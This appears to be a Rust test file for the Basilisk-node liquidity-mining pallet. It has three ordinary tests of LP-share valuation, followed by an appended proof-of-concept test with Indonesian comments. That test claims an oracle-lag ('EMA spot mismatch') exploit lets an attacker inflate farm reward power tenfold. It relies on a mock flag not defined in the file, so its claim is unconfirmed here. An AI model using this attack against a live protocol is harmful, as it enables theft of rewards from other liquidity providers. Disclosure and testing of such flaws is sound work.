// This file is part of Basilisk-node.

// Copyright (C) 2020-2022  Intergalactic, Limited (GIB).
// SPDX-License-Identifier: Apache-2.0

// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//NOTE: This function is provided as callback for other pallets.

use super::*;

#[test]
fn get_token_value_of_lp_shares_should_return_valued_of_correct_token_when_amm_exists() {
	ExtBuilder::default()
		.with_endowed_accounts(vec![(BOB, BSX, 1_000_000 * ONE), (ALICE, BSX_KSM_SHARE_ID, 100 * ONE)])
		.with_amm_pool(BSX_KSM_AMM, BSX_KSM_SHARE_ID, BSX_KSM_ASSET_PAIR)
		.build()
		.execute_with(|| {
			let amm_pool_id = DummyAMM::get_pair_id(AssetPair {
				asset_in: BSX,
				asset_out: KSM,
			});

			//Arrange
			Tokens::set_balance(Origin::root(), amm_pool_id, BSX, 50, 0).unwrap();
			Tokens::set_balance(Origin::root(), amm_pool_id, KSM, 100, 0).unwrap();

			//Act & Assert
			pretty_assertions::assert_eq!(
				LiquidityMining::get_token_value_of_lp_shares(BSX, amm_pool_id, 1_000).unwrap(),
				1_000
			);
			pretty_assertions::assert_eq!(
				LiquidityMining::get_token_value_of_lp_shares(KSM, amm_pool_id, 1_000).unwrap(),
				2_000
			);
		});
}

#[test]
fn get_token_value_of_lp_shares_should_whould_fail_when_request_asset_is_not_in_the_amm() {
	ExtBuilder::default()
		.with_endowed_accounts(vec![(BOB, BSX, 1_000_000 * ONE), (ALICE, BSX_KSM_SHARE_ID, 100 * ONE)])
		.with_amm_pool(BSX_KSM_AMM, BSX_KSM_SHARE_ID, BSX_KSM_ASSET_PAIR)
		.build()
		.execute_with(|| {
			let amm_pool_id = DummyAMM::get_pair_id(AssetPair {
				asset_in: BSX,
				asset_out: KSM,
			});

			//Arrange
			Tokens::set_balance(Origin::root(), amm_pool_id, BSX, 50, 0).unwrap();
			Tokens::set_balance(Origin::root(), amm_pool_id, KSM, 100, 0).unwrap();

			//Act & Assert
			assert_noop!(
				LiquidityMining::get_token_value_of_lp_shares(DOT, amm_pool_id, 1_000),
				Error::<Test>::AssetNotInAssetPair
			);
		});
}

#[test]
fn get_token_value_of_lp_shares_should_whould_fail_when_cannot_get_assets_for_amm_pool_id() {
	ExtBuilder::default()
		.with_endowed_accounts(vec![(BOB, BSX, 1_000_000 * ONE), (ALICE, BSX_KSM_SHARE_ID, 100 * ONE)])
		.with_amm_pool(BSX_KSM_AMM, BSX_KSM_SHARE_ID, BSX_KSM_ASSET_PAIR)
		.build()
		.execute_with(|| {
			let amm_pool_id = DummyAMM::get_pair_id(AssetPair {
				asset_in: BSX,
				asset_out: DOT,
			});

			//Act & Assert
			assert_noop!(
				LiquidityMining::get_token_value_of_lp_shares(BSX, amm_pool_id, 1_000),
				Error::<Test>::CantGetXykAssets
			);
		});
}


#[test]
fn exploit_ema_spot_mismatch() {
    ExtBuilder::default()
        .with_endowed_accounts(vec![
            // Alice adalah Hacker. Dia nyiapin modal buat nyerang.
            (ALICE, BSX_KSM_SHARE_ID, 1_000 * ONE),
        ])
        .with_amm_pool(BSX_KSM_AMM, BSX_KSM_SHARE_ID, BSX_KSM_ASSET_PAIR)
        .build()
        .execute_with(|| {
            let amm_pool_id = DummyAMM::get_pair_id(AssetPair {
                asset_in: BSX,
                asset_out: KSM,
            });

            // 1. Kondisi Spot Pool saat ini SANGAT KECIL karena habis di-dump/ditarik likuiditasnya.
            // Pool cuma punya 100 BSX secara Spot.
            Tokens::set_balance(Origin::root(), amm_pool_id, BSX, 100 * ONE, 0).unwrap();
            Tokens::set_balance(Origin::root(), amm_pool_id, KSM, 1_000_000 * ONE, 0).unwrap();

            // 2. TAPI, Oracle masih LAGGING. Oracle mengira pool masih punya 1_000 BSX.
            ORACLE_LAG_MOCK.with(|v| *v.borrow_mut() = true);

            // 3. Attacker menyetorkan (deposit_shares) LP tokennya yang didapat dari modal Spot.
            // Anggap attacker mendepositokan 1000 LP Token barunya.
            let attacker_lp_shares = 1_000 * ONE;

            // 4. Kalkulasi Sistem yang Cacat Terjadi di sini!
            let attacker_valuated_reward_power = LiquidityMining::get_token_value_of_lp_shares(
                BSX, 
                amm_pool_id, 
                attacker_lp_shares
            ).unwrap();

            // 5. THE EXPLOIT:
            // Sistem memberikan Alice (Hacker) valuasi Reward Power sebesar 1_000 BSX.
            // PADAHAL total BSX asli yang ada di Spot pool SAAT INI cuma 100 BSX.
            // Valuasi Alice menjadi 10x lipat lebih besar dari total aset yang ada di pool, 
            // sehingga Alice akan menyedot 100% dari seluruh Reward Farm tanpa sisa!
            pretty_assertions::assert_eq!(
                attacker_valuated_reward_power, 
                1_000 * ONE
            );
            
            println!("[+] BINGO! Attacker successfully inflated their reward power by 10x using EMA Lag!");
        });
					  }
